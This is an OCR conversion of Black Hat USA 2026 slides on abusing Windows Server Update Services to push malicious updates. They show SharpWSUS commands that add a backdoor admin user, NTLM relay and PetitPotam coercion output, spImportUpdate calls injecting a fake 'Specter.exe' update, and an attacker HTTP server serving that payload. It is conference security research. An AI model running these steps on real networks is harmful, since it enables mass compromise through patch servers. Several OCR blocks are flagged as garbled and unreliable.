---
title: "Turning Enterprise Update Servers Into Backdoor Factories (0_o)"
speakers: ["bagelByt3s"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/bagelByt3s_Turning Enterprise Update Servers Into Backdoor Factories (0_o).pdf"
pages: 77
sha256: "3371c0035cd4317ee589b5665b6a1b38ea55aba34e86906e5d3ecff2929219b7"
text_chars: 39827
ocr_pages: 57
has_ocr: true
redacted_secrets: 0
ocr_confidence: 90.0
ocr_unreliable_blocks: 4
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:50:17Z"
---
# Turning Enterprise Update Servers Into Backdoor Factories (0_o)

**Speakers:** bagelByt3s  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/bagelByt3s_Turning Enterprise Update Servers Into Backdoor Factories (0_o).pdf` (77 pages)


## Slide 1

Turning Enterprise Update Servers Into Backdoor Factories (0_o)

Beyviel David

Beyviel David Adversary Simulation Consultant

## Slide 2

# W hoami

- Adversary Simulation Consultant

- I love to eat

- I go by “Bagel”

- I like to push limits

2

## Slide 3

## How Attackers W in

Domain Controller

Privileged Fileshare

Endpoint Management Infrastructure

Certificate
Management
Infrastructure

3

## Slide 4

# Introduction

4


> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Introduction
De | unsigned_shOrt Nov 15th, 2024 at 3:23 AM
"sew we, at the very least, have control over the wsus database (edited)
4 replies
Ne | unsigned_shOrt Nov 15th, 2024 at 3:28 AM
‘aw | dont know enough about wsus or have the time to lab things out to take
advantage of it
| believe we could do things like create and approve malicious updates or modify
update metadata
```

## Slide 5

# Que es WSUS?

5


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Windows Server Getstarted Learn Windows Server Troubleshooting Previous versions documentation Resources Vv
=2 Find by title
Management
> Overview
> Azure Arc enabled server
> Windows Server Azure Arc Management
> Windows Admin Center
> System Center
¥ Built-in management tools
> What is the Server Core installation option?
> Manage on-premises systems with Server Manager
Install Remote Server Administration Tools
> Manage Windows with OpenSSH
Y Windows Server Update Services (WSUS)
Windows Server Update Services (WSUS)
> Deploy Windows Server Update Services
> Update Management with Windows Server Update
Services
> Express update delivery ISV support
Migrating the WSUS database from Windows Internal
Database (WID) to SQL
Windows Console behavior in Windows Server
> Collect information about your environment and
systems
Learn / Windows Server / Administration / | © Ask Learn 6® Focus mode
Windows Server Update Services (WSUS)
overview
Applies to: [4 Windows Server 2025, [4 Windows Server 2022, Ej Windows Server 2019, EJ Windows Server 2016, EJ Windows 11,
Windows 10
Windows Server Update Services (WSUS) provides a way for IT administrators to deploy the latest Microsoft product
updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to
computers on your network. This article provides an overview of this server role and more information about how to
deploy and maintain WSUS.
© Note
WSUS is deprecated and is no longer adding new features. However, it continues to be supported for production
deployments, and receives security and quality updates as per the product lifecycle. For more info, see Features
removed or no longer developed in Windows Server.
WSUS Server role description
A WSUS server provides features that you can use to manage and distribute updates through a management console. A
WSUS server can also be the update source for other WSUS servers within the organization. The WSUS server that acts as
an update source is called an upstream server. In a WSUS implementation, at least one WSUS server on your network
must be able to connect to Microsoft Update to get available update information. As an administrator, you can
```

## Slide 6

# Que es WSUS?

6


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Learn / Windows Server / Administration / | fo Ask Learn | 60 Focus mode
Windows Server Update Services (WSUS)
overview
Applies to: kg Windows Server 2025, kj Windows Server 2022, kg Windows Server 2019, 4 Windows Server 2016, Kx Windows 11, |
Windows 10
Windows Server Update Services (WSUS) provides a way for IT administrators to deploy the latest Microsoft product
updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to
computers on your network. This article provides an overview of this server role and more information about how to
deploy and maintain WSUS.
© Note
WSUS is deprecated and is no longer adding new features. However, it continues to be supported for production
deployments, and receives security and quality updates as per the product lifecycle. For more info, see Features
removed or no longer developed in Windows Server.
```

## Slide 7

# Que es WSUS?

7


> Recovered by OCR — confidence 96/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Windows Server Update Services (WSUS)
overview
Windows Server Update Services (WSUS) provides a way for IT administrators to deploy the latest Microsoft product
updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to
computers on your network. This article provides an overview of this server role and more information about how to
```

## Slide 8

- W SUS Client

• Configured via Registry or GPO • Initiates Update to W SUS Server

8


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
¢ WSUS Client
° Configured via Registry or GPO
° Initiates Update to W SUS Server
```

## Slide 9

•
•
•
•

• W SUS Server • Downloads Updates from Microsoft • Approves and deploys updates to client

• Can be configured with to be upstream/downstream

9

## Slide 10

- W SUS Database

- Stores Update Metadata

- • W indows Internal Database (W ID) • External SQL Server

10


> Recovered by OCR — confidence 73/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
— ¢ WSUS Database
a | ¢ Stores Update Metadata
a | * Windows Internal Database (W ID)
ae e External SQL Server
10
```

## Slide 11

11

## Slide 12

12

## Slide 13

Upstream

Downstream

13

## Slide 14

Client

Client

Upstream

Downstream

14


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Client Upstream
Client Downstream
14
```

## Slide 15

Client

Upstream

Database

Client

Downstream

Database

15

## Slide 16

Client

Upstream

Database

Client

Downstream

Database

16


> Recovered by OCR — confidence 96/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Client Upstream
Client Downstream
Database
Database
16
```

## Slide 17

# SharpWSUS

17


> Recovered by OCR — confidence 91/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
SharpWSUS
I.) \v v/s __) |
Phil Keeble @ Nettitude Red Team
Commands listed below have optional parameters in <>.
Locate the WSUS server:
SharpWSUS.exe locate
Inspect the WSUS server, enumerating clients, servers and existing groups
SharpWSUS.exe inspect
Create an update (NOTE: The payload has to be a windows signed binary):
SharpWSUS.exe create /payload:[File location] /args:[Args for payload] </title:[Update title] /date
Approve an update:
SharpWSUS.exe approve /updateid:[UpdateGUID] /computername:[Computer to target] </groupnam
Check status of an update:
SharpWSUS.exe check /updateid:[UpdateGUID] /computername: [Target FQDN]
Delete update and clean up groups added:
SharpWSUS.exe delete /updateid:[UpdateGUID] /computername:[Target FQDN] </groupname:[GroupName] /ke
```

## Slide 18

# SharpWSUS

18


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
SharpWSUS
Lateral Movement
A key consideration with WSUS lateral movement is that there is no way to control when a client checks
in from the server. This means that once a patch is deployed the lateral movement won’t succeed until
the client installs the update. Often times the client will check in for patches on a regular cycle, for
example daily, but the patches won’t be installed until a patching day that might happen once a month.
Some clients may be configured to install patches immediately if their priority level is high enough.
The first step of abusing WSUS is to create the malicious patch, which does have some limitations. When
creating the patch there are various values that can be configured through the command line in
SharpWSUS, allowing the operator to change the Indicators of Compromise (loCs) of the patch. There is
also a value for the payload and arguments. The payload must be a Microsoft signed binary and must
point to a location on disk for the WSUS server to that binary.
While the need for a signed binary can limit some attack paths, there are still plenty of binaries that could
be used such as PsExec.exe to run a command as SYSTEM, RunDLL32.exe to run a malicious DLL ona
network share, MsBuild.exe to grab and execute a remote payload and more. The example in this blog
will use PsExec.exe for code execution (https://docs.microsoft.com/en-
us/sysinternals/downloads/psexec).
A patch leveraging PsExec.exe can be done with the following command:
SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-
accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add && net
localgroup administrators WSUSDemo /add\"" /title: "WSUSDemo"
18
```

## Slide 19

19


> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
SharpWSUS, allowing the operator to change the Indicators of Compromise (loCs) of the patch. There is
also a value for the payload and arguments, The payload must be a Microsoft signed binary and must
point to a location on disk for the WSUS server to that binary.
While the need for a signed binary can limit some attack paths, there are still plenty of binaries that could
be used such as PsExec.exe to run a command as SYSTEM, RunDLL32.exe to run a malicious DLL ona
network share, MsBuild.exe to grab and execute a remote payload and more. The example in this blog
will use PsExec.exe for code execution (https://docs.microsoft.com/en-
us/sysinternals/downloads/psexec).
A patch leveraging PsExec.exe can be done with the following command:
SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:'-
accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add && net
```

## Slide 20

# Exploitation Difficulty

- W SUS Administrator

- W SUS File System Access

- Digitally Signature

Paella = Lots of Effort R equired

20

## Slide 21

Does the upstream W SUS server have administrative permissions over the downstream W SUS server?

21


> Recovered by OCR — confidence 96/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Does the upstream W SUS server have
administrative permissions over the
downstream W SUS server?
21
```

## Slide 22

# NTLM Coercion Testing SMB to SMB

Upstream

Downstream

Attacker

22


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
NTLM Coercion Testing
SMB to SMB
Ee |
Upstream Downstream
Attacker
22
```

## Slide 23

# NTLM Coercion Testing SMB to SMB

### 1. Setup Ntlmrelay on Attack Machine

2. Coerce Authentication to Upstream 3. R elay authentication to Downstream

Upstream

Downstream

SMB Session as Upstream server

Attacker

23

## Slide 24

NTLM Coercion Testing SMB to SMB

Downstream W SUS Server

24


> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
NTLM Coercion Testing
SMB to SMB
(env) root@ludus3:~# ntlmrelayx.py -t|smb://10.2.10.U] -socks -smb2support
Impacket v@.13.0 - Copyright Fortra, LLC and vee companies
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAPS loaded. .
[*] Protocol Client LDAP loaded..
[*] Protocol Client WINRMS Loaded. .
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client MSSQL loaded. .
[*] Protocol Client RPC loaded. .
[*] Protocol Client DCSYNC loaded. .
Downstream W SUS Server
```

## Slide 25

# NTLM Coercion Testing SMB to SMB

Attacker IP /
Ntlmrelayx
Upstream W SUS
Server

25


> Recovered by OCR — confidence 91/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
NTLM Coercion Testing
SMB to SMB
(env) root@Ludus3:/opt/PetitPotam# python3 PetitPotam.py -u domainuser -p password -d Ludus.nuketown 198.51.100.1 10.2.10.3
- rl Attacker IP /
Upstream W SUS
PoC to elicit machine account authentication via some MS-EFSRPC functions
by topotam (@topotam77)
Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
Trying pipe lsarpc
[-] Connecting to ncacn_np:10.2.10.3[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00cO4Fd90F7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception! !
[+] Attack worked!
```

## Slide 26

NTLM Coercion Testing SMB to SMB

26


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
NTLM Coercion Testing
SMB to SMB
ntlmrelayx> [*] (SMB): Received connection from 10.2.10.3, attacking target smb://10.2.10.u
[*] (SMB): Authenticating connection from LUDUS/WSUS1$@10.2.10.3 against smb://10.2.10.4 SUCCEED [1]
[*] SOCKS: Adding SMB: //LUDUS/WSUS1$@10.2.10.4(44U5) [1] to active SOCKS connection. Enjoy
[*] ALL targets processed!
[*] (SMB): Connection from 10.2.10.3 controlled, but there are no more targets left!
socks
Protocol Target Username AdminStatus} Port ID
SMB 10.2.10.4 LUDUS/WSUS1$ |_FALSE 4u5 1
26
```

## Slide 27

Does the upstream W SUS server have SQL access to the W SUS database?

**27**


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
blackhat
Does the upstream W SUS server have SQL access
to the W SUS database?
27
```

## Slide 28

NTLM Coercion Testing SMB to SMB

Upstream

Database

Attacker

28


> Recovered by OCR — confidence 96/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
NTLM Coercion Testing
SMB to SMB
Upstream
Database
Attacker
28
```

## Slide 29

NTLM Coercion Testing SMB to SMB

Upstream

Database

Attacker

29


> Recovered by OCR — confidence 96/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
NTLM Coercion Testing
SMB to SMB
Upstream
Database
Attacker
29
```

## Slide 30

# NTLM Coercion Testing SMB to SMB

### 1. Setup Ntlmrelay on Attack Machine

2. Coerce Authentication to Upstream

3. R elay authentication to Database

Upstream

Database

SQL Session as upstream server

Attacker

30

## Slide 31

NTLM Coercion Testing SMB to MSSQL

31


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
NTLM Coercion Testing
SMB to MSSQL
[*] (SMB): Received connection from 10.2.10.3, attacking target|/mssql://10.2.10.2
[*] Encryption required, switching to TLS
[*] (SMB): Authenticating connection from|LUDUS/WSUS1$@10.2.10.3 against mssql://10.2.10.2 SUCCEED] [1]
[*] SOCKS: Adding MSSQL://LUDUS/WSUS1$@10.2.10.2(1433) [1] to active SOCKS connection. Enjoy
[*] All targets processed!
[*] (SMB): Connection from 10.2.10.3 controlled, but there are no more targets left!
socks
Protocol Target Username AdminStatus} Port ID
MSSQL 10.2.10.2 LUDUS/WSUS1$ [N/A 1433 1
Bi
```

## Slide 32

# Exploitation Difficulty

- W SUS Administrator

- W SUS File System Access

- Digitally Signature

32


> Recovered by OCR — confidence 80/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploitation Difficulty
¢ WSUS Administrator
* WSUS File System Access
* Digitally Signature
3322
```

## Slide 33

# NTLM Coercion Testing SMB to MSSQL

33


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
NTLM Coercion Testing
SMB to MSSQL
SQL CLUDUS\WSUS1$ gquest@master)> SELECT name from sys.databases;
name
```

## Slide 34

# Blocker: Limited SQL Permissions

**34**


> Recovered by OCR — confidence 84/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Blocker: Limited SQL Permissiorg
SQL (LUDUS\WSUS1$ LUDUS\WSUS1$@SUSDB)> SELECT TOP 1 * FROM susdb.dbo.tbAuthorization
ERROR(SQL1-WSUS): Line 1:|The SELECT permission was denied|on the object 'tbAuthorization', da
SQL CLUDUS\WSUS1$ LUDUS\WSUS1$@SUSDB)> SELECT TOP 1 * FROM susdb.dbo.tbCategory
ERROR(SQL1-WSUS): Line 1:]The SELECT permission was denied]on the object 'tbCategory', databas
SQL (LUDUS\WSUS1$ LUDUS\WSUS1$@SUSDB)> SELECT TOP 1 * FROM susdb.dbo.tbFile
ERROR(SQL1-WSUS): Line 1:/ The SELECT permission was denied] on the object 'tbFile', database 'S
Chris Thompson
Mayyhem
```

## Slide 35

# Blocker: Limited SQL Permissions

35


> Recovered by OCR — confidence 91/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Blocker: Limited SQL Permissions
PUBLIC@SUSDB
MSSQL_MemberOf
© LUDUS\WSUS1$@SUSDB
MSSQL_Contains
MSSQL_Connect
35
```

## Slide 36

# Blocker: Limited SQL Permissions

- Only EXECUTE Permissions on Stored Procedures

- No SELECT/UPDATE/DELETE permissions on any W SUS tables

36

## Slide 37

The webService role is limited to specific stored procedures

37


> Recovered by OCR — confidence 96/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
The webService role is limited to specific stored
procedures
37
```

## Slide 38

# Stored Procedures

38


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Running Stored Procedures
Applies to: © SQL Server @ Azure SQL Database © Azure SQL Managed Instance @
Azure Synapse Analytics © Analytics Platform System (PDW)
A stored procedure is an executable object stored in a database. SQL Server supports:
e Stored procedures:
One or more SQL statements precompiled into a single executable procedure.
e Extended stored procedures:
C or C++ dynamic-link libraries (DLL) written to the SQL Server Open Data Services API
for extended stored procedures. The Open Data Services API extends the capabilities of
```

## Slide 39

# Stored Procedures

39


> Recovered by OCR — confidence 96/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
One or more SQL statements precompiled into a single executable procedure.
```

## Slide 40

# Stored Procedures

WSUS Server

Database

40


> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Stored Procedures
Bim
WSUS Server
Database
40
```

## Slide 41

# Stored Procedures

spImportUpdate

W SUS Server

Database

41

## Slide 42

## spImportUpdate

## Imports new update into the W SUS database

42


> Recovered by OCR — confidence 93/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
splmportUpdate
blackhat
Imports new update into the W SUS
database
42
```

## Slide 43

## spImportUpdate

Imports new update into the W SUS database

43


> Recovered by OCR — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
splmportUpdate
SQL (LUDUS\WSUS1$ LUDUS\WSUS1$@SUSDB)> declare @iImported int declare @iLocalRevi
int exec spImportUpdate @UpdateXm1=N ]
@UpstreamServerLocalID=1,@Imported=@i
ct @iImported,@iLocalRevisionID
INFO(SQL1-WSUS): Line 1792: Update A7751C4D-EAB5-45EF-8CD7-2FAE2FEA1252\1 is successfull
y added into the database
43
```

## Slide 44

44


> Recovered by OCR — confidence 83/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
SQL (LUDUS\WSUS1$ LUDUS\WSUS1$@SUSDB)> declare @iImported int declare @iLocalRevisionID
int exec spImportUpdate @UpdateXml=N'<upd:Update xmlns:b="http://schemas.microsoft.com/ms
us/2002/12/LogicalApplicabilityRules" xmlns:pub="http://schemas.microsoft.com/msus/2002/1
2/Publishing" xmlns:cbs="http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/Cbs" xm
tp://schemas.microsoft.com/msus/2002/12/Update"><upd:UpdateIdentity UpdateID="a7751c4d-ea
b5-45ef-8cd7-2fae2feal252" RevisionNumber="1" /><upd:Properties DefaultPropertiesLanguage
="en" UpdateType="Software" ExplicitlyDeployable="true" Handler="http://schemas.microsof
t.com/msus/2002/12/UpdateHandlers/Cbs" MaxDownloadSize="2095616" MinDownloadSize="209561
6" PublicationState="Published" CreationDate="2025-08-31T00:03:55.912Z" PublisherID="3953
oot" /><upd:UninstallationBehavior RebootBehavior="CanRequestReboot" /></upd:Properties><
upd: LocalizedPropertiesCollection><upd:LocalizedProperties><upd: Language>en</upd: Language
><upd: Title>Specter</upd: Title></upd:LocalizedProperties></upd:LocalizedPropertiesCollect
ion><upd:ApplicabilityRules><upd:IsInstalled><b:False /></upd:IsInstalled><upd:IsInstalla
ble><b:True /></upd:IsInstallable></upd:ApplicabilityRules><upd:Files><upd:File Digest="y
2/wvtpOW/1SgnhTjJoi3xE1EGM=" DigestAlgorithm="SHA1" FileName="Specter.exe" Size="209561
6" Modified="2025-08-31T15:26:20.723"><upd:AdditionalDigest Algorithm="SHA256">g1M2EFXHDs
```

## Slide 45

45

## Slide 46

46


> Recovered by OCR — confidence 84/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
oot" /><upd:UninstallationBehavior RebootBehavior="CanRequestReboot" /></upd:Properties><
upd: LocalizedPropertiesCollection><upd:LocalizedProperties><upd: Language>en</upd: Language
ion><upd:ApplicabilityRules><upd:IsInstalled><b:False /></upd:IsInstalled><upd:IsInstalla
ble><b:True /></upd:IsInstallable></upd:ApplicabilityRules><upd:Files><upd:File Digest="y
2/wvtpOW/1SgnhTjjJoi3xELEGM=" DigestAlgorithm="SHA1" FileName="Specter.exe" Size="209561
6" Modified="2025-08-31T15:26:20.723"><upd:AdditionalDigest Algorithm="SHA256">g1M2EFXHDs
lerSpecificData xsi:type="cmd: CommandLineInstallation" xmlns:xsi="http://www.w3.org/200e
1/XMLSchema-instance" xmlns:pub="http://schemas.microsoft.com/msus/2002/12/Publishing"><c
md:InstallCommand Arguments= Program="Specter.exe" RebootByDefault="false" DefaultResul
t="Succeeded" xmlns:cmd="http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/Command
LineInstallation"><cmd:ReturnCode Reboot="false" Result="Succeeded" Code="@" /></cmd:Inst
INFO(SQL1-WSUS): Line 1792: Update A7751C4D-EAB5-45EF-8CD7-2FAE2FEA1252\1 is successfull
y added into the database
```

## Slide 47

47

## Slide 48

# Stored Procedures

spImportUpdate spSaveXmlFragment spSaveXmlFragment spSaveXmlFragment spImportUpdate spSaveXmlFragment spSaveXmlFragment spSaveXmlFragment spSetBatchURL spGetAllTargetGroups spCreateTargetGroup spGetComputerTargetByName spDeployUpdate

Create Parent Update

Create Child Update W SUS Server

Database

Target Computer

48

## Slide 49

# Blocker: Trouble Downloading

49


> Recovered by OCR — confidence 92/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Blocker: Trouble Downloading
# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.2.10.3 - - [20/Dec/2025 15:08:09] "HEAD /Specter.exe HTTP/1.1" 200 -
10.2.10.3 - - [20/Dec/2025 15:08:09] "GET /Specter.exe HTTP/1.1" 200 -
Exception occurred during processing of request from ('10.2.10.3', 51944)
Traceback (most recent call last):
File "/usr/lib/python3.11/socketserver.py", Line 691, in process_request_thread
49
```

## Slide 50

# Blocker: Trouble Downloading

50


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Blocker: Trouble Downloading
Specter
b@ The files for this update failed to download. The update can be approved but will not be available to computers until
the download is complete. Click Retry Download to start the download again.
Status: MSRC severity: Critical
Computers with errors MSRC number:
puters needing this update Release date: Saturday, August 30, 2025
Computers installed/not applicable KB article numbers: 5006103
© Computers with no status: 3
2 2?
50
```

## Slide 51

Blocker: Trouble Downloading

51


> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
SoftwareDistribution - Notepad
File Edit Format View Help
NotificationEventName: ContentSyncAgent, EventInfo:
2025-12-28 20:08:13.949 UTC Info WsusService.49 ThreadEntry ThreadHelper. ThreadStart
B | ocke r: T rc 2025-12-28 20:08:13.949 UTC Info WsusService.49 SusEventDispatcher.DispatchManagerWorkerThreadProc
e DispatchManager Worker Thread Processing NotificationEvent: ContentSyncAgent
2025-12-20 20:08:13.949 UTC Info WsusService.5@ ThreadEntry ThreadHelper.ThreadStart
2025-12-28 20:08:13.949 UTC Info WsusService.5@ SusEventDispatcher.RegisterEventHandler RegisterEventHandler called
for NotificationEventName: ConfigurationChange
2025-12-20 20:08:13.964 UTC Info WsusService.5@ EventLogEventReporter.ReportEvent
EventId=361, Type=Information, Category=Synchronization,Message=Content synchronization started.
2025-12-20 20:08:13.949 UTC Info WsusService.8 SusEventDispatcher.TriggerEvent TriggerEvent called for
Specter NotificationEventName: DeploymentChange, EventInfo: DeploymentChange
2025-12-20 20:08:13.964 UTC Info WsusService.5@ ContentSyncAgent.WakeUpWorkerThreadProc ServerHealth: Updating Server
+ Health for Component: ContentSyncAgent Running, Marking as Running
Y, 1 ic 2025-12-28 20:08:13.964 UTC Info WsusService.5@ ContentSyncAgent.WakeUpWorkerThreadProc Processing Item: ele609f1-
td The files for this update 436e-4fba-a9d0-3291eb717ecd, State: 10
the download is comple 2025-12-20 20:08:14.073 UTC Info WsusService.5@ ContentSyncAgent.Download Item: e1e609f1-436e-4fba-a9d0-
3291eb717ecd has been submitted to BITS for Download
Status: 2025-12-20 20:08:14.073 UTC Info WsusService.5@ ContentSyncAgent.WakeUpWorkerThreadProc ContentSyncAgent found no more
= Jobs, going to Sleep for BITS Notifications
Computers 2025-12-20 20:08:34.898 UTC Info WsusService.52 ThreadEntry ThreadHelper. ThreadStart
2025-12-28 20:08:34.098 UTC Error WsusService.52 ContentSyncAgent.JobError Download error:
http: //198.51.100.1:8000/Specter.exe failed in download: (-2145386477) The server does not support the necessary HTTP
Computers protocol. Background Intelligent Transfer Service (BITS) requires that the server support the Range protocol header.
Computers
Computers at Microsoft.UpdateServices.ServerSync.ContentSyncAgent.JobError(IBitsJob job, BitsJobError joberror, String
fileRemoteName)
at Microsoft.UpdateServices.ServerSync.ContentSyncAgent .MonitorStatusThreadProc()
at System. Threading. ExecutionContext.RunInternal(ExecutionContext executionContext, ContextCallback callback, Object state,
Boolean preserveSyncCtx)
at System. Threading. ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state, Boolean
preserveSyncCtx)
at System. Threading. ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state)
at System. Threading. ThreadHelper.ThreadStart()
2025-12-28 20:08:34.098 UTC Warning WsusService.5@ ContentSyncAgent.ProcessBITSNotificationQueue ContentSyncAgent
recieved Failure for Item: e1e609f1-436e-4fba-a9d@-3291eb717ecd, Item fails
2025-12-28 20:08:34.098 UTC Info WsusService.5@ ContentSyncAgent.ContentSyncSPFireStateMachineEvent
KontentSyncAgent firing Event: FileDownloadFailed for Item: e1e609f1-436e-4fba-a9d@-3291eb717ecd
```

## Slide 52

52


> Recovered by OCR — confidence 84/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DispatchManager Worker Thread Processing NotificationEvent: ContentSyncAgent
2025-12-20 20:08:13.949 UTC Info WsusService.5@ ThreadEntry ThreadHelper. ThreadStart
2025-12-26 26:08:13.949 UTC Info WsusService.5@ SusEventDispatcher.RegisterEventHandler RegisterEventHandler called
for NotificationEventName: ConfigurationChange
2025-12-26 26:08:13.964 UTC Info WsusService.5@ EventLogEventReporter.ReportEvent
EventId=361, Type=Information, Category=Synchronization,Message=Content synchronization started.
2025-12-26 26:08:13.949 UTC Info WsusService.6 SusEventDispatcher.TriggerEvent TriggerEvent called for
NotificationEventName: DeploymentChange, EventInfo: DeploymentChange
2025-12-26 26:08:13.964 UTC Info WsusService.5@ ContentSyncAgent.WakeUpWorkerThreadProc ServerHealth: Updating Server
Health for Component: ContentSyncAgent Running, Marking as Running
2025-12-20 20:08:13.964 UTC Info WsusService.5@ ContentSyncAgent.WakeUpWorkerThreadProc Processing Item: eleoeorl-
436e-4fba-a9d@-329leb/lvecd, State: 10
2625-12-26 26:68:14.073 UTC Info WsusService.5@ ContentSyncAgent.Download Item: e1e609f1-436e-4fba-aSde-
3291eb71fecd has been submitted to BITS for Download
2025-12-26 26:08:14.073 UTC Info WsusService.5@ ContentSyncAgent.WakeUpWorkerThreadProc ContentSyncAgent found no more
Jobs, going to Sleep for BITS Notifications
2625-12-26 26:08:34.898 UTC Info WsusService.52 ThreadEntry ThreadHelper. ThreadStart
2025-12-26 26:08:34.098 UTC Error WsusService.52 ContentSyncAgent.JobError Download error:
http://198.51.100.1:8006/Specter.exe failed in download: (-2145386477) The server does not support the necessary HTTP
protocol. Background Intelligent Transfer Service (BITS) requires that the server support the Range protocol header.
at Microsoft.UpdateServices.ServerSync.ContentSyncAgent.JobError(IBitsJob job, BitsJobError joberror, String
fileRemoteName)
at System. Threading. ExecutionContext.RunInternal(ExecutionContext executionContext, ContextCallback callback, Object state,
Boolean preserveSyncCtx)
at System. Threading. ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state, Boolean
preserveSyncCtx)
at System. Threading. ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state)
at System. Threading. ThreadHelper. ThreadStart()
2625-12-26 26:68:34.098 UTC Warning WsusService.5@ ContentSyncAgent.ProcessBITSNotificationQueue ContentSyncAgent
```

## Slide 53

53


> Recovered by OCR — confidence 94/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
http: //198.51.100.1:8000/Specter.exe failed in download: (-2145386477) The server does not support the necessary HTTP
protocol. Background Intelligent Transfer Service (BITS) requires that the server support the Range protocol header.
```

## Slide 54

# Blocker: Trouble Downloading

54


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Blocker: Trouble Downloading
# python3 |pythonServer_SupportsBits. py
Starting HTTP Range Server on port 8000
Serving files from: /mnt/remote-share/Mythic_Payloads
Server URL: http://localhost:8000/
Press Ctrl+C to stop the server
[10.2.10.3] |"HEAD /Specter.exe HTTP/1.1" 200 -
[10.2.10.3] |"GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] |"GET /Specter.exe HTTP/1.1" 206 -
